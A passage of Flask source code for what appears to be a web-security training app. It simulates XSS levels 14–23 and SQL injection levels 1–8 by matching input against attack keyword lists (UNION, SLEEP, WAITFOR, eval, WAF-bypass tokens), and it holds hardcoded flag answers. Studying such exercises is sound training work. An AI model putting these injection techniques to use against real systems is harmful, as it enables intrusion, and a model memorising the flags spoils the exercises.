    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level14.html',
                          config_saved=config_saved,
                          config_name=config_name,
                          config_json=config_json,
                          flag=flag,
                          user=user,
                          xss_detected=xss_detected,
                          challenge=challenge,
                          message=message)

# XSS Level 15 - XSS via Template Injection
@app.route('/xss/level15', methods=['GET', 'POST'])
def xss_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    template_saved = False
    template_name = None
    template_subject = None
    template_content = None
    rendered_template = None
    flag = None
    xss_detected = False
    message = ""

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS via Template Injection").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."
    current_date = datetime.now().strftime('%B %d, %Y')

    if request.method == 'POST':
        # Get form data
        template_name = request.form.get('template_name', '')
        template_subject = request.form.get('template_subject', '')
        template_content = request.form.get('template_content', '')
        template_saved = True

        # Check for template injection
        if ('constructor.constructor' in template_content or
            'eval(' in template_content or
            'alert("XSS Level 15 Completed!")' in template_content or
            "alert('XSS Level 15 Completed!')" in template_content):
            xss_detected = True
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="XSS via Template Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Template saved, but no XSS detected. Try using template injection to trigger the alert."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS via Template Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level15.html',
                          template_saved=template_saved,
                          template_name=template_name,
                          template_subject=template_subject,
                          template_content=template_content,
                          rendered_template=rendered_template,
                          current_date=current_date,
                          flag=flag,
                          user=user,
                          xss_detected=xss_detected,
                          challenge=challenge,
                          message=message)

# XSS Level 16 - XSS in WebAssembly Applications
@app.route('/xss/level16', methods=['GET', 'POST'])
def xss_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS in WebAssembly Applications").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    # Check for intended payload in POST requests
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 16 Completed!")' in user_input or "alert('XSS Level 16 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in WebAssembly Applications").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."

    challenge = Challenge.query.filter_by(name="XSS in WebAssembly Applications").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level16.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 17 - XSS in Progressive Web Apps
@app.route('/xss/level17', methods=['GET', 'POST'])
def xss_level17():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS in Progressive Web Apps").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    if request.method == 'POST':
        user_input = request.form.get('input', '')
        manifest_json = request.form.get('manifest', '')
        service_worker_js = request.form.get('service_worker', '')

        # Check for XSS in any of the inputs
        if ('alert("XSS Level 17 Completed!")' in user_input or
            "alert('XSS Level 17 Completed!')" in user_input or
            'alert("XSS Level 17 Completed!")' in manifest_json or
            "alert('XSS Level 17 Completed!')" in manifest_json or
            'alert("XSS Level 17 Completed!")' in service_worker_js or
            "alert('XSS Level 17 Completed!')" in service_worker_js):
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in Progressive Web Apps").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described. Look for vulnerabilities in the PWA components."
    challenge = Challenge.query.filter_by(name="XSS in Progressive Web Apps").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level17.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 18 - XSS via Web Components
@app.route('/xss/level18', methods=['GET', 'POST'])
def xss_level18():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 18 Completed!")' in user_input or "alert('XSS Level 18 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS via Web Components").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS via Web Components").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level18.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 19 - XSS in GraphQL APIs
@app.route('/xss/level19', methods=['GET', 'POST'])
def xss_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 19 Completed!")' in user_input or "alert('XSS Level 19 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in GraphQL APIs").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS in GraphQL APIs").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level19.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 20 - XSS in WebRTC Applications
@app.route('/xss/level20', methods=['GET', 'POST'])
def xss_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 20 Completed!")' in user_input or "alert('XSS Level 20 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in WebRTC Applications").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS in WebRTC Applications").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level20.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 21 - XSS via Web Bluetooth/USB
@app.route('/xss/level21', methods=['GET', 'POST'])
def xss_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 21 Completed!")' in user_input or "alert('XSS Level 21 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS via Web Bluetooth/USB").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS via Web Bluetooth/USB").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level21.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 22 - XSS in WebGPU Applications
@app.route('/xss/level22', methods=['GET', 'POST'])
def xss_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 22 Completed!")' in user_input or "alert('XSS Level 22 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in WebGPU Applications").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS in WebGPU Applications").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level22.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# XSS Level 23 - XSS in Federated Identity Systems
@app.route('/xss/level23', methods=['GET', 'POST'])
def xss_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False
    message = ""
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        if 'alert("XSS Level 23 Completed!")' in user_input or "alert('XSS Level 23 Completed!')" in user_input:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS in Federated Identity Systems").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to trigger the alert as described."
    challenge = Challenge.query.filter_by(name="XSS in Federated Identity Systems").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)
    return render_template('xss/xss_level23.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message)

# SQL Injection Level 1 - Basic SQL Injection
@app.route('/sqli/level1', methods=['GET', 'POST'])
def sqli_level1():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    error = None
    success = None

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "OR", "=", "UNION", "SELECT", "DROP", "INSERT", "DELETE", "UPDATE"]

        # Convert to uppercase for case-insensitive check
        username_upper = username.upper()
        password_upper = password.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in username_upper or pattern.upper() in password_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Simulate a vulnerable login system
        if sqli_detected:
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="Basic SQL Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)

            success = "SQL Injection detected! You've successfully bypassed the login."
        else:
            # Normal login attempt (will always fail for this challenge)
            error = "Invalid username or password."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Basic SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level1.html', flag=flag, sqli_detected=sqli_detected, error=error, success=success)

# SQL Injection Level 2 - SQL Injection in Search
@app.route('/sqli/level2', methods=['GET'])
def sqli_level2():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    search_term = request.args.get('search', '')
    search_performed = bool(search_term)
    products = []

    # Default products
    default_products = [
        {"id": 1, "name": "Smartphone X", "category": "Electronics", "price": 999.99},
        {"id": 2, "name": "Laptop Pro", "category": "Electronics", "price": 1499.99},
        {"id": 3, "name": "Wireless Headphones", "category": "Audio", "price": 199.99},
        {"id": 4, "name": "Smart Watch", "category": "Wearables", "price": 299.99},
        {"id": 5, "name": "Bluetooth Speaker", "category": "Audio", "price": 129.99}
    ]

    # Secret product (only shown when SQL injection is successful)
    secret_product = {"id": 42, "name": "Secret Gadget", "category": "Classified", "price": 9999.99}

    if search_term:
        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "OR", "=", "UNION", "SELECT", "DROP", "INSERT", "DELETE", "UPDATE"]

        # Convert to uppercase for case-insensitive check
        search_upper = search_term.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in search_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Filter products based on search term
        products = [p for p in default_products if search_term.lower() in p["name"].lower()]

        # If SQL injection is detected and specifically looking for product with ID 42
        if sqli_detected and ("42" in search_term or "id=42" in search_term.lower() or "id = 42" in search_term.lower()):
            products.append(secret_product)

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="SQL Injection in Search").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
        # If SQL injection is detected with a generic attack that would return all products
        elif sqli_detected and ("1=1" in search_term.lower() or "or" in search_term.lower()):
            products = default_products.copy()
            products.append(secret_product)

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="SQL Injection in Search").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in Search").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level2.html', flag=flag, sqli_detected=sqli_detected,
                          search_term=search_term, search_performed=search_performed, products=products)

# SQL Injection Level 3 - SQL Injection with UNION
@app.route('/sqli/level3', methods=['GET'])
def sqli_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    search_term = request.args.get('search', '')
    search_performed = bool(search_term)
    books = []

    # Default books
    default_books = [
        {"id": 1, "title": "The Great Gatsby", "author": "F. Scott Fitzgerald", "category": "Fiction", "year": 1925},
        {"id": 2, "title": "To Kill a Mockingbird", "author": "Harper Lee", "category": "Fiction", "year": 1960},
        {"id": 3, "title": "1984", "author": "George Orwell", "category": "Science Fiction", "year": 1949},
        {"id": 4, "title": "Pride and Prejudice", "author": "Jane Austen", "category": "Romance", "year": 1813},
        {"id": 5, "title": "The Hobbit", "author": "J.R.R. Tolkien", "category": "Fantasy", "year": 1937}
    ]

    # Hidden users table (only accessible through UNION-based SQL injection)
    users = [
        {"id": 1, "username": "admin", "password": "FLAG{uni0n_b4s3d_sql1_m4st3r}", "role": "admin", "created": 2023}
    ]

    if search_term:
        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "UNION", "SELECT", "FROM", "WHERE"]

        # Convert to uppercase for case-insensitive check
        search_upper = search_term.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in search_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Filter books based on search term
        books = [b for b in default_books if search_term.lower() in b["title"].lower()]

        # If UNION-based SQL injection is detected
        if sqli_detected and "UNION" in search_upper and "SELECT" in search_upper:
            # Check if the query is trying to access the users table
            if "USER" in search_upper or "ADMIN" in search_upper:
                # Add the admin user to the results, formatted to match the books table structure
                admin_user = users[0]
                books.append({
                    "id": admin_user["id"],
                    "title": admin_user["username"],
                    "author": admin_user["password"],
                    "category": admin_user["role"],
                    "year": admin_user["created"]
                })

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="SQL Injection with UNION").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection with UNION").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level3.html', flag=flag, sqli_detected=sqli_detected,
                          search_term=search_term, search_performed=search_performed, books=books)

# SQL Injection Level 4 - Blind SQL Injection
@app.route('/sqli/level4', methods=['GET'])
def sqli_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    user_id = request.args.get('id', '')
    user_exists = None

    # Hidden users
    hidden_users = {
        "1": {"username": "admin", "password": "admin123"},
        "2": {"username": "user", "password": "password123"},
        "3": {"username": "guest", "password": "guest"},
        "42": {"username": "admin_secret", "password": "FLAG{bl1nd_sql1_3xtr4ct10n_pr0}"}
    }

    if user_id:
        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "AND", "OR", "=", "SELECT", "FROM", "WHERE", "SUBSTRING", "ASCII"]

        # Convert to uppercase for case-insensitive check
        user_id_upper = user_id.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in user_id_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Check if user exists
        if sqli_detected:
            # If the query is trying to find the admin_secret user (ID 42)
            if "42" in user_id or "admin_secret" in user_id.lower():
                user_exists = True

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Blind SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            # If the query is using blind SQL injection techniques to extract data
            elif "SUBSTRING" in user_id_upper or "ASCII" in user_id_upper or "MID" in user_id_upper or "CHAR" in user_id_upper:
                user_exists = True

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Blind SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                # For other SQL injection attempts, return random results to simulate blind injection
                import random
                user_exists = random.choice([True, False])
        else:
            # Normal user lookup
            user_exists = user_id in hidden_users

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Blind SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level4.html', flag=flag, sqli_detected=sqli_detected,
                          user_id=user_id, user_exists=user_exists)

# SQL Injection Level 5 - Time-Based Blind SQL Injection
@app.route('/sqli/level5', methods=['GET', 'POST'])
def sqli_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    message = None
    message_type = "info"
    response_time = None

    if request.method == 'POST':
        email = request.form.get('email', '')

        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "SLEEP", "BENCHMARK", "DELAY", "PG_SLEEP", "WAITFOR"]

        # Convert to uppercase for case-insensitive check
        email_upper = email.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in email_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Simulate response time
        import time
        start_time = time.time()

        if sqli_detected:
            # Simulate a time delay for time-based blind SQL injection
            if "SLEEP" in email_upper or "BENCHMARK" in email_upper or "DELAY" in email_upper or "PG_SLEEP" in email_upper or "WAITFOR" in email_upper:
                # Simulate a database query that takes time
                time.sleep(3)

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Time-Based Blind SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

                message = "Thank you for subscribing to our newsletter!"
                message_type = "success"
            else:
                message = "Invalid email format. Please try again."
                message_type = "danger"
        else:
            message = "Thank you for subscribing to our newsletter!"
            message_type = "success"

        end_time = time.time()
        response_time = round(end_time - start_time, 2)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Time-Based Blind SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level5.html', flag=flag, sqli_detected=sqli_detected,
                          message=message, message_type=message_type, response_time=response_time)

# SQL Injection Level 6 - SQL Injection with WAF Bypass
@app.route('/sqli/level6', methods=['GET'])
def sqli_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    waf_blocked = False
    search_term = request.args.get('search', '')
    search_performed = bool(search_term)
    products = []

    # Default products
    default_products = [
        {"id": 1, "name": "Premium Smartphone", "category": "Electronics", "price": 1299.99, "stock": 45},
        {"id": 2, "name": "Ultra Laptop", "category": "Electronics", "price": 2499.99, "stock": 20},
        {"id": 3, "name": "Noise-Canceling Headphones", "category": "Audio", "price": 349.99, "stock": 78},
        {"id": 4, "name": "Fitness Smartwatch", "category": "Wearables", "price": 399.99, "stock": 56},
        {"id": 5, "name": "Portable Bluetooth Speaker", "category": "Audio", "price": 199.99, "stock": 112}
    ]

    # Secret product (only shown when SQL injection is successful)
    secret_product = {"id": 999, "name": "Classified Device", "category": "Restricted", "price": 99999.99, "stock": 1}

    if search_term:
        # WAF rules - block common SQL injection patterns
        waf_patterns = ["'", "\"", "--", "#", "/*", "*/", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "="]

        # Check if any WAF pattern is in the input
        for pattern in waf_patterns:
            if pattern in search_term:
                # WAF blocked the request
                waf_blocked = True
                break

        if not waf_blocked:
            # Check for SQL injection patterns that might bypass the WAF
            bypass_patterns = ["||", "oR", "AnD", "uNiOn", "sElEcT", "1=1", "/**/", "%27", "0x"]

            # Check if any bypass pattern is in the input
            for pattern in bypass_patterns:
                if pattern in search_term:
                    # SQL injection with WAF bypass detected!
                    sqli_detected = True
                    break

            # Filter products based on search term
            products = [p for p in default_products if search_term.lower() in p["name"].lower()]

            # If SQL injection with WAF bypass is detected
            if sqli_detected:
                # Add the secret product to the results
                products.append(secret_product)

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="SQL Injection with WAF Bypass").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection with WAF Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level6.html', flag=flag, sqli_detected=sqli_detected,
                          search_term=search_term, search_performed=search_performed,
                          products=products, waf_blocked=waf_blocked)

# SQL Injection Level 7 - Error-Based SQL Injection
@app.route('/sqli/level7', methods=['GET'])
def sqli_level7():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    category_id = request.args.get('id', '')
    category = None
    error_message = None

    # Default categories
    default_categories = {
        "1": {"id": 1, "name": "Electronics", "description": "Electronic devices and gadgets"},
        "2": {"id": 2, "name": "Clothing", "description": "Apparel and fashion items"},
        "3": {"id": 3, "name": "Books", "description": "Books, e-books, and publications"},
        "4": {"id": 4, "name": "Home & Garden", "description": "Items for home and garden"},
        "5": {"id": 5, "name": "Sports & Outdoors", "description": "Sports equipment and outdoor gear"}
    }

    if category_id:
        # Check for SQL injection patterns
        sqli_patterns = ["'", "\"", "--", ";", "UNION", "SELECT", "FROM", "WHERE", "CONCAT", "GROUP BY", "FLOOR", "RAND", "COUNT", "EXTRACTVALUE", "UPDATEXML"]

        # Convert to uppercase for case-insensitive check
        category_id_upper = category_id.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in category_id_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        if sqli_detected:
            # Simulate error-based SQL injection
            if "CONCAT" in category_id_upper or "GROUP BY" in category_id_upper or "FLOOR" in category_id_upper or "RAND" in category_id_upper or "EXTRACTVALUE" in category_id_upper or "UPDATEXML" in category_id_upper:
                # Generate an error message that contains the flag
                error_message = "Error: SQLSTATE[42000]: Syntax error or access violation: 1690 BIGINT UNSIGNED value is out of range in '(SELECT 'FLAG{3rr0r_b4s3d_sql1_3xtr4ct10n}' FROM secrets WHERE key_name = 'level7_flag')'"

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Error-Based SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                # For other SQL injection attempts, return a generic error
                error_message = "Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" + category_id + "' at line 1"
        else:
            # Normal category lookup
            if category_id in default_categories:
                category = default_categories[category_id]
            else:
                error_message = "Error: Category not found"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Error-Based SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level7.html', flag=flag, sqli_detected=sqli_detected,
                          category_id=category_id, category=category, error_message=error_message)

# SQL Injection Level 8 - Second-Order SQL Injection
@app.route('/sqli/level8', methods=['GET', 'POST'])
def sqli_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False

    # Default profile values
    username = "test_user"
    bio = "I'm a security enthusiast."
    location = "Cyberspace"
    website = "https://example.com"

    # Profile to display when viewing a user
    profile = None
    view_user = request.args.get('view_user', '')

    # Simulated database of users
    users_db = {
        "admin": {
            "username": "admin",
            "bio": "System administrator",
            "location": "Server Room",
            "website": "https://admin.example.com",
            "is_admin": True,
            "secret": "The flag is: R00T{s3c0nd_0rd3r_sql1_1s_tr1cky}"
        },
        "test_user": {
            "username": "test_user",
            "bio": "I'm a security enthusiast.",
            "location": "Cyberspace",
            "website": "https://example.com",
            "is_admin": False
        }
    }

    # Handle profile update (POST request)
    if request.method == 'POST':
        username = request.form.get('username', '')
        bio = request.form.get('bio', '')
        location = request.form.get('location', '')
        website = request.form.get('website', '')

        # Simulate storing the profile in the database
        # In a real second-order SQL injection, this would be sanitized but still vulnerable
        users_db["test_user"] = {
            "username": username,
            "bio": bio,
            "location": location,
            "website": website,
            "is_admin": False
        }

        # Success message would be shown here

    # Handle profile viewing (GET request with view_user parameter)
    if view_user:
        # This is where the second-order SQL injection vulnerability exists
        # The application doesn't properly sanitize the stored username when using it in a query

        # Check for SQL injection patterns in the view_user parameter
        sqli_patterns = ["'", "\"", "--", ";", "OR", "=", "UNION", "SELECT", "DROP", "INSERT", "DELETE", "UPDATE"]

        # Convert to uppercase for case-insensitive check
        view_user_upper = view_user.upper()

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in view_user_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        if sqli_detected:
            # Simulate a successful SQL injection that reveals the admin profile
            profile = users_db.get("admin")

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="Second-Order SQL Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
        else:
            # Normal user lookup
            profile = users_db.get(view_user)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Second-Order SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level8.html', flag=flag, sqli_detected=sqli_detected,
                          username=username, bio=bio, location=location, website=website,
                          view_user=view_user, profile=profile)

# SQL Injection Level 9 - SQL Injection in REST API
@app.route('/sqli/level9', methods=['GET', 'POST'])
